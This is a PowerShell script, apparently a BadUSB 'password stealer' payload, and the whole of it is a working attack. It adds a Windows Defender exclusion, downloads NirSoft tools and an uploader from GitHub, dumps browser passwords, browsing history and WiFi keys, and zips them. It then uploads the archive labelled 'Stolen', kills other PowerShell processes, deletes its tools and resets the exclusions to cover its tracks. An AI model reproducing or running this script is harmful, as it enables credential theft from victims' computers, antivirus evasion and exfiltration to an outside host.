Set-Location C:\Users\Public\Documents #Go to the folder in which we will donwload files
Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
Invoke-WebRequest https://raw.githubusercontent.com/lshaf/BadUSB_passStealer/main/other_files/fin.ps1 -OutFile fin.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
Invoke-WebRequest https://github.com/lshaf/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
Invoke-WebRequest https://github.com/lshaf/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
Invoke-WebRequest https://github.com/lshaf/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
Invoke-WebRequest https://github.com/lshaf/BadUSB_passStealer/blob/main/other_files/uploader.exe?raw=true -OutFile uploader.exe #Download the nirsoft tool for Browser passwords
.\WebBrowserPassView.exe /stext dust_passwords.txt #Create the file for Browser passwords
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext dust_history.txt #Create the file for Browser history
.\WirelessKeyView.exe /stext dust_wifi.txt #Create the file for WiFi passwords
Start-Sleep -Seconds 10 #Wait for 60 seconds (because connected devices file take a minute to be created)
Compress-Archive dust_* "$env:UserDomain$(Get-Date -Format yyyymmdd).zip"
Start-Sleep -Seconds 5
.\uploader.exe -f "$env:UserDomain$(Get-Date -Format yyyymmdd).zip" -c "Stolen $env:UserDomain on $(Get-Date -Format yyyy-mm-dd)"
Start-Sleep -Seconds 20 #Wait for 60 seconds (because connected devices file take a minute to be created)
Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
Start-Sleep -Seconds 15 #Wait 30 seconds
#Delete nirsoft tools and .ps1 file
Remove-Item BrowsingHistoryView.exe
Remove-Item WNetWatcher.exe
Remove-Item WNetWatcher.cfg
Remove-Item WirelessKeyView.exe
Remove-Item WebBrowserPassView.exe
Remove-Item uploader.exe
Remove-Item ciaoV2.ps1
Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
powershell.exe -noexit -windowstyle hidden -file fin.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
exit #End .ps1 file
